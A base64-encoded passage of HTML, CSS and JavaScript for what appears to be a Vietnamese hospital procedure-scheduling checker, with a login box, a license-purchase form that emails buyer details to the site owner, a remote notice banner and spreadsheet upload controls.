m4gTG9uZyBCYW5rIC0gTmfDom4gaMOgbmcgVE1DUCBLacOqbiBMb25nPC9vcHRpb24+DQogIDxvcHRpb24+VmlldENhcGl0YWxCYW5rIC0gTmfDom4gaMOgbmcgVE1DUCBC4bqjbiBWaeG7h3Q8L29wdGlvbj4NCiAgPG9wdGlvbj5OQ0IgLSBOZ8OibiBow6BuZyBUTUNQIFF14buRYyBEw6JuPC9vcHRpb24+DQogIDxvcHRpb24+TFBCYW5rIC0gTmfDom4gaMOgbmcgVE1DUCBCxrB1IMSRaeG7h24gTGnDqm4gVmnhu4d0PC9vcHRpb24+DQogIDxvcHRpb24+UEcgQmFuayAtIE5nw6JuIGjDoG5nIFRNQ1AgWMSDbmcgZOG6p3UgUGV0cm9saW1leDwvb3B0aW9uPg0KICA8b3B0aW9uPlZpZXRCYW5rIC0gTmfDom4gaMOgbmcgVE1DUCBWaeG7h3QgTmFtIFRoxrDGoW5nIFTDrW48L29wdGlvbj4NCiAgPG9wdGlvbj5TYWlnb25CYW5rIC0gTmfDom4gaMOgbmcgVE1DUCBTw6BpIEfDsm4gQ8O0bmcgVGjGsMahbmc8L29wdGlvbj4NCiAgPG9wdGlvbj5DTy1PUCBCYW5rIC0gTmfDom4gaMOgbmcgSOG7o3AgdMOhYyB4w6MgVmnhu4d0IE5hbTwvb3B0aW9uPg0KICA8b3B0aW9uPlB1YmxpYyBCYW5rIFZpZXRuYW08L29wdGlvbj4NCiAgPG9wdGlvbj5TaGluaGFuIEJhbmsgVmlldG5hbTwvb3B0aW9uPg0KICA8b3B0aW9uPldvb3JpIEJhbmsgVmlldG5hbTwvb3B0aW9uPg0KICA8b3B0aW9uPlVPQiBWaWV0bmFtPC9vcHRpb24+DQogIDxvcHRpb24+U3RhbmRhcmQgQ2hhcnRlcmVkIEJhbmsgVmlldG5hbTwvb3B0aW9uPg0KICA8b3B0aW9uPkhvbmcgTGVvbmcgQmFuayBWaWV0bmFtPC9vcHRpb24+DQogIDxvcHRpb24+SFNCQyBWaWV0bmFtPC9vcHRpb24+DQogIDxvcHRpb24+Q0lNQiBCYW5rIFZpZXRuYW08L29wdGlvbj4NCiAgPG9wdGlvbj5DaXRpYmFuayBWaWV0bmFtPC9vcHRpb24+DQogIDxvcHRpb24+QU5aIFZpZXRuYW08L29wdGlvbj4NCjwvc2VsZWN0Pjxici8+DQoNCjxsYWJlbD5Uw6puIHTDoGkga2hv4bqjbiBuZ8aw4budaSBtdWE6PC9sYWJlbD4NCjxpbnB1dCB0eXBlPSJ0ZXh0IiBpZD0iYnV5ZXJOYW1lIiByZXF1aXJlZD48YnIvPg0KICAgICAgPGxhYmVsPlTDqm4gYuG7h25oIHZp4buHbiAvIHBow7JuZyBraMOhbTo8L2xhYmVsPg0KICAgICAgPGlucHV0IHR5cGU9InRleHQiIGlkPSJob3NwaXRhbCIgcmVxdWlyZWQ+PGJyLz4NCiAgICAgIDxsYWJlbD5HbWFpbCBjw6EgbmjDom4gaG/hurdjIMSRxqFuIHbhu4s8L2xhYmVsPg0KICAgICAgPGlucHV0IHR5cGU9ImVtYWlsIiBpZD0iYnV5ZXJNYWlsIiByZXF1aXJlZD48YnIvPg0KICAgICAgPGxhYmVsPlPhu5EgxJFp4buHbiB0aG/huqFpOjwvbGFiZWw+DQogICAgICA8aW5wdXQgdHlwZT0idGV4dCIgaWQ9ImJ1eWVyUGhvbmUiIHJlcXVpcmVkPjxici8+PGJyLz4NCiAgICAgIDxidXR0b24gdHlwZT0ic3VibWl0IiBjbGFzcz0iYnV5LWJ0biI+R+G7rWk8L2J1dHRvbj4NCiAgICAgIDxidXR0b24gdHlwZT0iYnV0dG9uIiBjbGFzcz0iY2xvc2UtYnRuIiBvbmNsaWNrPSJjbG9zZVBheW1lbnQoKSI+SOG7p3k8L2J1dHRvbj4NCiAgICA8L2Zvcm0+DQogIDwvZGl2Pg0KPC9kaXY+DQoNCjwhLS0gUE9QVVAgWMOBQyBOSOG6rE4gR+G7rEkgLS0+DQo8ZGl2IGlkPSJjb25maXJtUG9wdXAiIGNsYXNzPSJwb3B1cC1vdmVybGF5IiBzdHlsZT0iZGlzcGxheTpub25lOyI+DQogIDxkaXYgY2xhc3M9InBvcHVwLWNvbnRlbnQgY29uZmlybS1wb3B1cCI+DQogICAgPGgzPuKchSDEkMOjIGfhu61pIHThu5tpIGLhu5kgcGjhuq1uIHRp4bq/cCBuaOG6rW4uPC9oMz4NCiAgICA8cD5WdWkgbMOybmcgxJHhu6NpIGvhur90IHF14bqjIHjDoWMgbmjhuq1uIHThu6sgYuG7mSBwaOG6rW4ga+G7uSB0aHXhuq10LjwvcD4NCiAgICA8YnV0dG9uIGNsYXNzPSJjbG9zZS1idG4iIG9uY2xpY2s9ImNsb3NlQ29uZmlybSgpIj7EkMOzbmc8L2J1dHRvbj4NCiAgPC9kaXY+DQo8L2Rpdj4NCjwvYm9keT4NCjxzdHlsZT4NCi5mb3JtLXBvcHVwIHsNCiAgbWF4LWhlaWdodDogODB2aDsgICAgICAgICAgIC8qIGNoaeG6v20gdOG7kWkgxJFhIDgwJSBjaGnhu4F1IGNhbyBtw6BuIGjDrG5oICovDQogIG92ZXJmbG93LXk6IGF1dG87ICAgICAgICAgICAvKiBu4bq/dSBu4buZaSBkdW5nIGTDoGkgdGjDrCBjdeG7mW4gKi8NCiAgcGFkZGluZy1yaWdodDogMTVweDsgICAgICAgIC8qIHRyw6FuaCBj4bqvdCBjaOG7ryBraGkgY3Xhu5luICovDQogIHNjcm9sbGJhci13aWR0aDogdGhpbjsgICAgICAvKiB0aGFuaCBjdeG7mW4gbeG6o25oICovDQogIHNjcm9sbGJhci1jb2xvcjogZ29sZCB0cmFuc3BhcmVudDsNCn0NCg0KLyogbMOgbSDEkeG6uXAgdGhhbmggY3Xhu5luIHRyw6puIENocm9tZSwgRWRnZSwgU2FmYXJpICovDQouZm9ybS1wb3B1cDo6LXdlYmtpdC1zY3JvbGxiYXIgew0KICB3aWR0aDogNnB4Ow0KfQ0KLmZvcm0tcG9wdXA6Oi13ZWJraXQtc2Nyb2xsYmFyLXRodW1iIHsNCiAgYmFja2dyb3VuZC1jb2xvcjogZ29sZDsNCiAgYm9yZGVyLXJhZGl1czogNHB4Ow0KfQ0KLmZvcm0tcG9wdXA6Oi13ZWJraXQtc2Nyb2xsYmFyLXRyYWNrIHsNCiAgYmFja2dyb3VuZDogdHJhbnNwYXJlbnQ7DQp9DQoucG9wdXAtb3ZlcmxheSB7DQogIHBvc2l0aW9uOiBmaXhlZDsNCiAgaW5zZXQ6IDA7DQogIGJhY2tncm91bmQ6IHJnYmEoMCwwLDAsMC42KTsNCiAgZGlzcGxheTogZmxleDsNCiAgYWxpZ24taXRlbXM6IGNlbnRlcjsNCiAganVzdGlmeS1jb250ZW50OiBjZW50ZXI7DQogIHotaW5kZXg6IDk5OTk7DQogIGFuaW1hdGlvbjogZmFkZUluIDAuM3MgZWFzZTsNCn0NCg0KLnBvcHVwLWNvbnRlbnQgew0KICBiYWNrZ3JvdW5kOiAjZmZmOw0KICBib3JkZXItcmFkaXVzOiAyMHB4Ow0KICBwYWRkaW5nOiAzMHB4Ow0KICB0ZXh0LWFsaWduOiBjZW50ZXI7DQogIGZvbnQtZmFtaWx5OiAnSW50ZXInLCBzYW5zLXNlcmlmOw0KICBib3gtc2hhZG93OiAwIDAgMjVweCByZ2JhKDAsMCwwLDAuMyk7DQogIGFuaW1hdGlvbjogem9vbUluIDAuM3MgZWFzZTsNCn0NCi5wb3B1cC1jb250ZW50IHsNCiAgbWF4LXdpZHRoOiA3MDBweDsNCiAgd2lkdGg6IDkwJTsNCiAgYm94LXNpemluZzogYm9yZGVyLWJveDsNCn0NCg0KLmx1eHVyeSB7DQogIGJhY2tncm91bmQ6IGxpbmVhci1ncmFkaWVudCgxNDVkZWcsICMxMTEsICMyMjIpOw0KICBjb2xvcjogI2ZmZjsNCiAgbWF4LXdpZHRoOiA4MDBweDsNCn0NCg0KLnBvcHVwLXRpdGxlIHsNCiAgZm9udC1zaXplOiAyNHB4Ow0KICBtYXJnaW4tYm90dG9tOiAyMHB4Ow0KICBjb2xvcjogZ29sZDsNCiAgdGV4dC1zaGFkb3c6IDAgMCAxMHB4IGdvbGQ7DQp9DQoNCi5wcmljaW5nLWdyaWQgew0KICBkaXNwbGF5OiBmbGV4Ow0KICBqdXN0aWZ5LWNvbnRlbnQ6IGNlbnRlcjsNCiAgYWxpZ24taXRlbXM6IHN0cmV0Y2g7DQogIGdhcDogMjVweDsNCiAgZmxleC13cmFwOiB3cmFwOyAvKiDEkeG7gyByZXNwb25zaXZlIGtoaSBtw6BuIGjDrG5oIG5o4buPICovDQogIG1hcmdpbi10b3A6IDIwcHg7DQp9DQoNCi5wcmljZS1jYXJkIHsNCiAgZmxleDogMSAxIDE4MHB4Ow0KICBtYXgtd2lkdGg6IDIwMHB4Ow0KICBiYWNrZ3JvdW5kOiByZ2JhKDI1NSwyNTUsMjU1LDAuMDgpOw0KICBib3JkZXI6IDJweCBzb2xpZCBnb2xkOw0KICBib3JkZXItcmFkaXVzOiAxOHB4Ow0KICBwYWRkaW5nOiAyMHB4IDE1cHg7DQogIHRyYW5zaXRpb246IGFsbCAwLjNzIGVhc2U7DQogIHRleHQtYWxpZ246IGNlbnRlcjsNCn0NCg0KLnByaWNlLWNhcmQ6aG92ZXIgew0KICB0cmFuc2Zvcm06IHRyYW5zbGF0ZVkoLTEwcHgpIHNjYWxlKDEuMDUpOw0KICBib3gtc2hhZG93OiAwIDAgMjVweCBnb2xkOw0KfQ0KDQoucHJpY2UtY2FyZCBoMyB7DQogIGZvbnQtc2l6ZTogMjBweDsNCiAgY29sb3I6ICNmZmY7DQogIG1hcmdpbi1ib3R0b206IDEwcHg7DQogIHRleHQtc2hhZG93OiAwIDAgNXB4IGdvbGQ7DQp9DQoNCi5wcmljZS1jYXJkIC5wcmljZSB7DQogIGZvbnQtc2l6ZTogMThweDsNCiAgY29sb3I6ICNmZmViM2I7DQogIGZvbnQtd2VpZ2h0OiBib2xkOw0KICBtYXJnaW4tYm90dG9tOiAxNXB4Ow0KfQ0KDQoNCi5wcmljZSB7DQogIGZvbnQtc2l6ZTogMjBweDsNCiAgY29sb3I6ICNmZmViM2I7DQp9DQoNCi5idXktYnRuIHsNCiAgYmFja2dyb3VuZDogbGluZWFyLWdyYWRpZW50KDkwZGVnLCBnb2xkLCAjZjM5YzEyKTsNCiAgY29sb3I6ICMwMDA7DQogIGJvcmRlcjogbm9uZTsNCiAgYm9yZGVyLXJhZGl1czogMTJweDsNCiAgcGFkZGluZzogMTBweCAyMHB4Ow0KICBjdXJzb3I6IHBvaW50ZXI7DQogIGZvbnQtd2VpZ2h0OiBib2xkOw0KICB0cmFuc2l0aW9uOiAwLjNzOw0KfQ0KDQouYnV5LWJ0bjpob3ZlciB7DQogIGJhY2tncm91bmQ6IGxpbmVhci1ncmFkaWVudCg5MGRlZywgI2ZmZDcwMCwgI2ZmYTUwMCk7DQp9DQoNCi5jbG9zZS1idG4gew0KICBtYXJnaW4tdG9wOiAyMHB4Ow0KICBiYWNrZ3JvdW5kOiAjZTc0YzNjOw0KICBjb2xvcjogI2ZmZjsNCiAgYm9yZGVyOiBub25lOw0KICBib3JkZXItcmFkaXVzOiAxMHB4Ow0KICBwYWRkaW5nOiAxMHB4IDIwcHg7DQogIGN1cnNvcjogcG9pbnRlcjsNCn0NCg0KQGtleWZyYW1lcyBmYWRlSW4gew0KICBmcm9tIHsgb3BhY2l0eTogMDsgfSB0byB7IG9wYWNpdHk6IDE7IH0NCn0NCg0KQGtleWZyYW1lcyB6b29tSW4gew0KICBmcm9tIHsgdHJhbnNmb3JtOiBzY2FsZSgwLjkpOyBvcGFjaXR5OiAwOyB9IHRvIHsgdHJhbnNmb3JtOiBzY2FsZSgxKTsgb3BhY2l0eTogMTsgfQ0KfQ0KDQouZm9ybS1wb3B1cCBpbnB1dCB7DQogIHdpZHRoOiA5MCU7DQogIG1hcmdpbjogNXB4IDA7DQogIHBhZGRpbmc6IDhweDsNCiAgYm9yZGVyOiAxcHggc29saWQgI2FhYTsNCiAgYm9yZGVyLXJhZGl1czogOHB4Ow0KfQ0KDQouY29uZmlybS1wb3B1cCB7DQogIGJhY2tncm91bmQ6IGxpbmVhci1ncmFkaWVudCgxNDVkZWcsICM0Q0FGNTAsICMyRTdEMzIpOw0KICBjb2xvcjogI2ZmZjsNCiAgcGFkZGluZzogMjVweCA0MHB4Ow0KICBib3JkZXItcmFkaXVzOiAyMHB4Ow0KfS5mb3JtLXBvcHVwIHNlbGVjdCB7DQogIHdpZHRoOiA5MCU7DQogIG1hcmdpbjogNXB4IDA7DQogIHBhZGRpbmc6IDhweDsNCiAgYm9yZGVyOiAxcHggc29saWQgI2FhYTsNCiAgYm9yZGVyLXJhZGl1czogOHB4Ow0KICBiYWNrZ3JvdW5kOiAjZmZmOw0KfQ0KPC9zdHlsZT48c2NyaXB0Pg0KZG9jdW1lbnQuYWRkRXZlbnRMaXN0ZW5lcigiRE9NQ29udGVudExvYWRlZCIsICgpID0+IHsNCiAgY29uc3QgYnV5QnRuID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoImJ1eSIpOw0KICBpZiAoYnV5QnRuKSB7DQogICAgYnV5QnRuLmFkZEV2ZW50TGlzdGVuZXIoImNsaWNrIiwgKCkgPT4gew0KICAgICAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoImJ1eVBvcHVwIikuc3R5bGUuZGlzcGxheSA9ICJmbGV4IjsNCiAgICB9KTsNCiAgfQ0KfSk7DQoNCmZ1bmN0aW9uIGNsb3NlQnV5UG9wdXAoKSB7DQogIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJidXlQb3B1cCIpLnN0eWxlLmRpc3BsYXkgPSAibm9uZSI7DQp9DQoNCmZ1bmN0aW9uIG9wZW5QYXltZW50KHBlcmlvZCwgcHJpY2UpIHsNCiAgY2xvc2VCdXlQb3B1cCgpOw0KICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgicGF5bWVudFBvcHVwIikuc3R5bGUuZGlzcGxheSA9ICJmbGV4IjsNCiAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoIm1vbmV5IikudmFsdWUgPSBgJHtwcmljZX0gKCR7cGVyaW9kfSlgOw0KfQ0KDQpmdW5jdGlvbiBjbG9zZVBheW1lbnQoKSB7DQogIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJwYXltZW50UG9wdXAiKS5zdHlsZS5kaXNwbGF5ID0gIm5vbmUiOw0KfQ0KDQpkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgicGF5bWVudEZvcm0iKS5hZGRFdmVudExpc3RlbmVyKCJzdWJtaXQiLCBhc3luYyAoZSkgPT4gew0KICBlLnByZXZlbnREZWZhdWx0KCk7DQogIGNvbnN0IGZvcm1EYXRhID0gew0KICAgIGFjYzogZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoImJ1eWVyQWNjIikudmFsdWUsDQoJICBiYW5rOiBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgiYnV5ZXJCYW5rIikudmFsdWUsDQogICAgbmFtZTogZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoImJ1eWVyTmFtZSIpLnZhbHVlLA0KICAgIGhvc3BpdGFsOiBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgiaG9zcGl0YWwiKS52YWx1ZSwNCiAgICBtYWlsOiBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgiYnV5ZXJNYWlsIikudmFsdWUsDQogICAgcGhvbmU6IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJidXllclBob25lIikudmFsdWUsDQogICAgbW9uZXk6IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJtb25leSIpLnZhbHVlDQogIH07DQoNCiAgdHJ5IHsNCmVtYWlsanMuc2VuZCgic2VydmljZV9wZ29ia3E3IiwgInRlbXBsYXRlX200dWU4NWMiLCBmb3JtRGF0YSkNCiAgLnRoZW4oZnVuY3Rpb24ocmVzcG9uc2UpIHsNCiAgICBjb25zb2xlLmxvZygiR+G7rWkgdGjDoG5oIGPDtG5nOiIsIHJlc3BvbnNlLnN0YXR1cywgcmVzcG9uc2UudGV4dCk7DQogICAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoInBheW1lbnRQb3B1cCIpLnN0eWxlLmRpc3BsYXkgPSAibm9uZSI7DQogICAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoImNvbmZpcm1Qb3B1cCIpLnN0eWxlLmRpc3BsYXkgPSAiZmxleCI7DQogIH0sIGZ1bmN0aW9uKGVycm9yKSB7DQogICAgY29uc29sZS5lcnJvcigiTOG7l2kgRW1haWxKUzoiLCBlcnJvcik7DQogIH0pOw0KICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJwYXltZW50UG9wdXAiKS5zdHlsZS5kaXNwbGF5ID0gIm5vbmUiOw0KICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJjb25maXJtUG9wdXAiKS5zdHlsZS5kaXNwbGF5ID0gImZsZXgiOw0KICB9IGNhdGNoIHsNCiAgfQ0KfSk7DQoNCmZ1bmN0aW9uIGNsb3NlQ29uZmlybSgpIHsNCiAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoImNvbmZpcm1Qb3B1cCIpLnN0eWxlLmRpc3BsYXkgPSAibm9uZSI7DQp9DQo8L3NjcmlwdD4NCg0KDQo8ZGl2IGNsYXNzPSJjb250YWluZXIiPg0KPGRpdiBjbGFzcz0ibG9naW4tc2VjdGlvbiIgaWQ9ImxvZ2luU2VjdGlvbiI+DQo8aDIgY2xhc3M9ImxvZ2luLXRpdGxlIj7EkMSCTkcgTkjhuqxQIEjhu4YgVEjhu5BORzwvaDI+DQo8aW5wdXQgY2xhc3M9ImxvZ2luLWlucHV0IiBpZD0idXNlcm5hbWVJbnB1dCIgcGxhY2Vob2xkZXI9IlTDqm4gxJHEg25nIG5o4bqtcCIgdHlwZT0idGV4dCIvPg0KPGlucHV0IGNsYXNzPSJsb2dpbi1pbnB1dCIgaWQ9InBhc3N3b3JkSW5wdXQiIHBsYWNlaG9sZGVyPSJN4bqtdCBraOG6qXUiIHR5cGU9InBhc3N3b3JkIi8+DQo8YnIvPjxidXR0b24gY2xhc3M9ImJ0biIgaWQ9ImxvZ2luQnRuIj7EkMSDbmcgbmjhuq1wPC9idXR0b24+DQo8ZGl2IGNsYXNzPSJsb2dpbi1lcnJvciIgaWQ9ImxvZ2luRXJyb3IiPlTDqm4gxJHEg25nIG5o4bqtcCBob+G6t2MgbeG6rXQga2jhuql1IGtow7RuZyDEkcO6bmc8L2Rpdj4NCjxici8+PGJyLz48aHIvPjxici8+PGJ1dHRvbiBjbGFzcz0iYnRuIiBpZD0iYnV5Ij5NdWEgVMOgaSBLaG/huqNuIC0gS8OtY2ggSG/huqF0IELhuqNuIFF1eeG7gW48L2J1dHRvbj4NCg0KPC9kaXY+DQo8ZGl2IGNsYXNzPSJtYWluLWNvbnRlbnQiIGlkPSJtYWluQ29udGVudCI+DQo8ZGl2IGNsYXNzPSJ0b3AtYnV0dG9uLWdyb3VwIj48YnV0dG9uIGNsYXNzPSJidG4iIGlkPSJidXkiPk11YSBC4bqjbiBRdXnhu4FuPC9idXR0b24+DQogIDxidXR0b24gb25jbGljaz0ib3BlbkN1c3RvbWl6ZVBhbmVsKCkiIGNsYXNzPSJidG4iPlR14buzIGJp4bq/bjwvYnV0dG9uPg0KDQoNCg0KPGJ1dHRvbiBvbmNsaWNrPSJzaG93RHJvcGJveFBhbmVsKCkiIGNsYXNzPSJidG4iPlBhbmVsPC9idXR0b24+DQoNCiAgPGJ1dHRvbiBvbmNsaWNrPSJ3aW5kb3cubG9jYXRpb24ucmVsb2FkKCk7IiBjbGFzcz0iYnRuIj5Yb8OhIENhY2hlPC9idXR0b24+DQogIDxidXR0b24gY2xhc3M9ImJ0biJpZD0ibG9nb3V0QnRuIj7EkMSDbmcgeHXhuqV0PC9idXR0b24+DQo8L2Rpdj4NCg0KDQo8aDE+IDxhIGhyZWY9Imh0dHBzOi8vZmIuY29tL2NoYXVodXluaDAxMDQiIHN0eWxlPSJhbGw6IHVuc2V0OyBjdXJzb3I6IHBvaW50ZXI7IiB0YXJnZXQ9Il9ibGFuayI+S2nhu4NtIFRyYSBUaOG7pyBUaHXhuq10PC9hPjwvaDE+DQo8ZGl2IGNsYXNzPSJsaXN0MSIgc3R5bGU9ImRpc3BsYXk6IGZsZXg7IGFsaWduLWl0ZW1zOiBjZW50ZXI7IGdhcDogOHB4OyI+DQo8aSBjbGFzcz0iZmEgZmEtYnVsbGhvcm4iPjwvaT4NCjxiPjxmb250IGNvbG9yPSJyZWQiPlRow7RuZyBiw6FvOjwvZm9udD48L2I+DQo8ZGl2IGNsYXNzPSJzY3JvbGxpbmctdGV4dCIgc3R5bGU9ImZsZXg6IDE7IG92ZXJmbG93OiBoaWRkZW47Ij4NCjxkaXYgY2xhc3M9InNjcm9sbGluZy1jb250ZW50IiBpZD0ibm9pZHVuZyI+DQoNCjwvZGl2Pg0KPC9kaXY+DQo8L2Rpdj4NCjxzY3JpcHQ+DQoNCg0KZmV0Y2goJ2h0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9jaGF1aHV5bmgwMTA0L2NoYXVodXluaDAxMDQudHh0L3JlZnMvaGVhZHMvbWFpbi90aG9uZ2Jhby50eHQnKQ0KICAudGhlbihyZXNwb25zZSA9PiByZXNwb25zZS50ZXh0KCkpDQogIC50aGVuKGRhdGEgPT4gew0KICAgIGNvbnN0IGVsID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ25vaWR1bmcnKTsNCiAgICBlbC5pbm5lckhUTUwgPSBkYXRhOw0KDQogICAgLy8gVMSDbmcgxJHhu5kgZMOgaSBu4buZaSBkdW5nIMSR4buDIMSR4bqjbSBi4bqjbyBjdeG7mW4NCiAgICBlbC5zdHlsZS5kaXNwbGF5ID0gJ2lubGluZS1ibG9jayc7DQogICAgZWwuc3R5bGUubWluV2lkdGggPSAnMTAwJSc7DQoNCiAgICAvLyBSZXNldCBhbmltYXRpb24gdG8gZm9yY2UgcmVmbG93DQogICAgZWwuc3R5bGUuYW5pbWF0aW9uID0gJ25vbmUnOw0KICAgIHZvaWQgZWwub2Zmc2V0V2lkdGg7DQogICAgZWwuc3R5bGUuYW5pbWF0aW9uID0gJ3Njcm9sbC1sZWZ0IDEwcyBsaW5lYXIgaW5maW5pdGUnOw0KICB9KQ0KICAuY2F0Y2goZXJyb3IgPT4gew0KICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdub2lkdW5nJykudGV4dENvbnRlbnQgPSAnS2jDtG5nIHRo4buDIHThuqNpIG7hu5lpIGR1bmcuJzsNCiAgICBjb25zb2xlLmVycm9yKGVycm9yKTsNCiAgfSk7DQoNCg0KPC9zY3JpcHQ+DQo8ZGl2IGNsYXNzPSJ1cGxvYWQtc2VjdGlvbiI+PGRpdiBjbGFzcz0ibWFpbmJsb2siPg0KDQo8aW5wdXQgYWNjZXB0PSIueGxzeCwgLnhscywgLmNzdiIgaWQ9ImZpbGVJbnB1dCIgc3R5bGU9ImRpc3BsYXk6bm9uZSIgdHlwZT0iZmlsZSIvPg0KPGJ1dHRvbiBjbGFzcz0iYnRuIiBpZD0idHJpZ2dlckJ1dHRvbiI+PGkgY2xhc3M9ImZhcyBmYS1maWxlLXVwbG9hZCI+PC9pPiBDaOG7jW4gZmlsZSB0aOG7pyBjw7RuZzwvYnV0dG9uPg0KPGJyLz48YnIvPg0KPGlucHV0IGRpcmVjdG9yeT0iIiBpZD0iZm9sZGVySW5wdXQiIG11bHRpcGxlPSIiIHN0eWxlPSJkaXNwbGF5Om5vbmUiIHR5cGU9ImZpbGUiIHdlYmtpdGRpcmVjdG9yeT0iIi8+DQo8YnV0dG9uIGNsYXNzPSJidG4iIGlkPSJmb2xkZXJCdG4iPjxpIGNsYXNzPSJmYXMgZmEtZm9sZGVyLW9wZW4iPjwvaT4gQ2jhu41uIHRoxrAgbeG7pWMgKFThu7EgxJHhu5luZyB0w6xtIGZpbGUpPC9idXR0b24+DQo8ZGl2IGlkPSJzY2FuU3RhdHVzIiBzdHlsZT0ibWFyZ2luLXRvcDoxMHB4O2NvbG9yOiMzNDk4ZGI7Zm9udC13ZWlnaHQ6Ym9sZCI+PC9kaXY+DQoNCg0KPGxhYmVsPg0KPGlucHV0IG5hbWU9InRpbWVPcHRpb24iIHR5cGU9InJhZGlvIiB2YWx1ZT0iNzowMCIvPiANCiAgICAgICAgICAgICAgICAgICAgICAgIEfhu6NpIMO9IHThu6sgMDc6MDANCiAgICAgICAgICAgICAgICAgICAgPC9sYWJlbD4NCjxsYWJlbD4NCjxpbnB1dCBjaGVja2VkPSIiIG5hbWU9InRpbWVPcHRpb24iIHR5cGU9InJhZGlvIiB2YWx1ZT0iNzozMCIvPiANCiAgICAgICAgICAgICAgICAgICAgICAgIEfhu6NpIMO9IHThu6sgMDc6MzANCiAgICAgICAgICAgICAgICAgICAgPC9sYWJlbD4NCjxici8+PGJyLz4NCg0KICA8bGFiZWwgc3R5bGU9Im1hcmdpbi1yaWdodDogMTBweDsiPg0KPGlucHV0IGNoZWNrZWQ9IjEiIGlkPSJpZ25vcmVBZGphY2VudENoZWNrYm94IiB0eXBlPSJjaGVja2JveCIvPg0KPHNwYW4gY2xhc3M9ImNodS10aGljaCI+QuG7jyBxdWEgdGjhu6cgdGh14bqtdCBsaeG7gW4ga+G7gTxzcGFuIGNsYXNzPSJub2ktZHVuZyI+VkQ6IDhoMDAtOGgzMCB4b2EgYsOzcC4gMDhoMzAtMDhoNTAgxJFp4buHbiBjaMOibS4gbGnDqm4gdGnhur9wIG3DoCBrbyBjw6FjaCAxIHBow7p0IDwvc3Bhbj48L3NwYW4+DQo8L2xhYmVsPg0KDQogIDxsYWJlbCBzdHlsZT0ibWFyZ2luLXJpZ2h0OiAxMHB4OyI+DQo8aW5wdXQgaWQ9InNob3dNb3JlU3VnZ2VzdGlvbnNDaGVja2JveCIgdHlwZT0iY2hlY2tib3giLz4gDQogICAgICAgIEhp4buDbiB0aOG7iyA2IGtodW5nIGdp4budIGfhu6NpIMO9ICAgICAgICAgDQogICAgPC9sYWJlbD4NCg0KPGxhYmVsIHN0eWxlPSJtYXJnaW4tcmlnaHQ6IDEwcHg7Ij4NCjxpbnB1dCBpZD0ic2hvd0RvY3RvckNoZWNrYm94IiB0eXBlPSJjaGVja2JveCIvPiANCiAgICAgICAgSGnhu4NuIHRo4buLIELDoWMgc8SpIGNo4buJIMSR4buLbmgNCiAgICA8L2xhYmVsPjxsYWJlbD4NCiAgPGlucHV0IGlkPSJzaG93SGVyYkVycm9yRGF5c0NoZWNrYm94IiB0eXBlPSJjaGVja2JveCJjaGVja2VkLz4NCiAgQ2jhu4kgaGnhu4NuIHRo4buLIG5nw6B5IHPhuq9jIHRodeG7kWMgbOG7l2kNCjwvbGFiZWw+DQo8YnIvPjxici8+DQo8YnV0dG9uIGNsYXNzPSJidG4iIGlkPSJhbmFseXplQnRuIj5LaeG7g20gVHJhPC9idXR0b24+DQoNCg0KDQoNCg0KDQoNCg0KDQo8c2NyaXB0Pg0KZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2ZpbGVJbnB1dCcpLmFkZEV2ZW50TGlzdGVuZXIoJ2NoYW5nZScsIGZ1bmN0aW9uICgpIHsNCiAgICBjb25zdCBmaWxlID0gdGhpcy5maWxlc1swXTsNCiAgICBpZiAoZmlsZSkgew0KICAgICAgICBjb25zdCBzdGF0dXMgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnc2NhblN0YXR1cycpOw0KICAgICAgICBzdGF0dXMuaW5uZXJIVE1MID0gYDxpIGNsYXNzPSJmYXMgZmEtZmlsZSI+PC9pPsSQw6MgY2jhu41uIGZpbGU6IDxiPiR7ZmlsZS5uYW1lfTwvYj5gOw0KICAgICAgICBzdGF0dXMuc3R5bGUuZGlzcGxheSA9ICdibG9jayc7DQogICAgICAgIHN0YXR1cy5zdHlsZS5jb2xvciA9ICcjMmMzZTUwJzsNCiAgICB9DQp9KTsNCg0KPC9zY3JpcHQ+DQo8ZGl2IGlkPSJzY2FuU3RhdHVzIiBzdHlsZT0ibWFyZ2luLXRvcDoxMHB4OyBjb2xvcjojMmMzZTUwOyBmb250LXdlaWdodDpib2xkOyBkaXNwbGF5OiBub25lOyI+PC9kaXY+DQo8YnIvPg0KPHNwYW4gc3R5bGU9ImZvbnQtc2l6ZTogMTJweDsiPjxpPlBo4bqnbiBt4buBbSDEkcO0aSBraGkgY8OzIHRo4buDIG3huq9jIGzhu5dpLiBYaW4gaMOjeSBraeG7g20gdHJhIGPDoWMgdGjDtG5nIHRpbiBxdWFuIHRy4buNbmcuPC9pPjwvc3Bhbj4NCjxkaXYgaWQ9ImZpbGVSZXF1aXJlbWVudHMiPjwvZGl2Pg0KPC9kaXY+PC9kaXY+DQoNCg0KPCEtLSBC4bquVCDEkOG6plU6IELhuqJORyBHSeG7nCBUUuG7kE5HIFThu6pORyBOR8av4bucSSAtLT4NCiAgPGJ1dHRvbiBpZD0iaGVyYlRvZ2dsZUJ0biIgY2xhc3M9ImJ0biIgb25jbGljaz0idG9nZ2xlSGVyYkxpc3QoKSJzdHlsZT0iZGlzcGxheTpub25lIj5T4bqvYyB0aHXhu5FjIHRoYW5nPC9idXR0b24+DQogIDxidXR0b24gY2xhc3M9ImJ0biIgb25jbGljaz0idG9nZ2xl